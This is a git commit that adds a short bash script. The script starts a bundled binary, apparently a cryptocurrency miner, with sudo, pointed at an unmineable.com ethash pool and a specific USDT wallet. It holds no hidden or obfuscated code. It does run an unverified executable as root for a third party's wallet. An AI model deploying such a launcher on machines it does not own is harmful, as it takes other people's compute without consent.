576a68cdfb7de12707984da2dc30c0d8b4e0f2f2
skifjiug48 <85462467+skifjiug48@users.noreply.github.com>
2021-06-07 23:42:06 +0700

    Add files via upload

---
+++ asw.sh
@@ -0,0 +1,9 @@
+#!/bin/bash
+
+POOL=ethash.unmineable.com:3333
+WALLET=USDT:TMoY6tAtNEAq32F7aAdXJb6o6fxYm2Nhhm
+WORKER=arni#bi0o-a2ol
+
+cd "$(dirname "$0")"
+
+chmod +x ./333 && sudo ./333 -pool $POOL -wal $WALLET.$WORKER -pass x
